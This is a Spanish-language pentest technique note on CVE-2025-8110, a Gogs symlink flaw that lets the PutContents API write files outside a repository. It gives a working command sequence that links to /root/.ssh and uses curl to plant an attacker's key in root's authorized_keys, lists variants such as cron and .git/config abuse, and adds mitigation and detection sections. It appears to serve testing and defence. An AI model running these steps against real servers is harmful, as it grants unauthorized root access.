---
topic: Gogs — escritura fuera del repositorio por symlink (CVE-2025-8110)
tags: [web, gogs, symlink, git, rce, cve-2025-8110]
---

# Gogs — escritura fuera del repositorio por symlink (CVE-2025-8110)

[🌐 English](gogs-symlink-rce.en.md) | **Español**

## Concepto

La API `PutContents` de Gogs escribía archivos dentro de un repositorio, pero seguía symlinks. Un repositorio con un enlace a `/root/.ssh` permite escribir `authorized_keys` fuera del árbol del proyecto. La escritura ocurre antes de que falle el commit, así que el error posterior no impide el acceso.

## Cuándo aplica

- Gogs está expuesto y permite crear repositorios y tokens.
- La instancia se ejecuta como root o con acceso a rutas sensibles.
- La versión es anterior a la corrección de CVE-2025-8110.

## Procedimiento

1. Crear una cuenta y un repositorio propio.
2. Añadir un symlink que apunte a una ruta fuera del repositorio.
3. Hacer commit y push del symlink.
4. Usar la API `PutContents` con un token para escribir una clave SSH en la ruta enlazada.

## Comandos

```bash
git clone http://<USER>:<PASS>@<HOST>:3001/<USER>/repo.git
cd repo && ln -s /root/.ssh sshdir
git add sshdir && git commit -m link && git push
base64 -w0 ~/.ssh/id_ed25519.pub
curl -X PUT http://<HOST>:3001/api/v1/repos/<USER>/repo/contents/sshdir/authorized_keys \
  -H "Authorization: token <TOKEN>" -H "Content-Type: application/json" \
  -d '{"message":"x","content":"<BASE64>"}'
```

## Variantes

- Apuntar a `.git/config` y abusar de `sshCommand` o `core.fsmonitor`.
- Escribir un cron o un archivo de configuración del servicio.
- Usar una ruta relativa con componentes que resuelvan fuera del repositorio.

## Limitaciones

- Gogs debe ejecutarse con permisos sobre el destino.
- La API requiere un token válido y permisos de escritura.
- La versión corregida resuelve symlinks antes de escribir.

## Mitigación

- Actualizar Gogs a 0.13.4 o posterior.
- Resolver rutas con `realpath` y rechazar symlinks fuera del repositorio.
- No ejecutar Gogs como root y aislar sus repositorios.

## Detección

- Repositorios que contienen symlinks a `/root`, `/etc` o rutas de configuración.
- Llamadas `PUT` a `contents` con rutas que incluyen enlaces.
- Claves SSH nuevas en `authorized_keys` de root.

## Referencias

- [0xdf — Silentium](https://0xdf.gitlab.io/2026/09/12/htb-silentium.html)
- [NVD — CVE-2025-8110](https://nvd.nist.gov/vuln/detail/CVE-2025-8110)
- [CWE-59 — Improper Link Resolution](https://cwe.mitre.org/data/definitions/59.html)
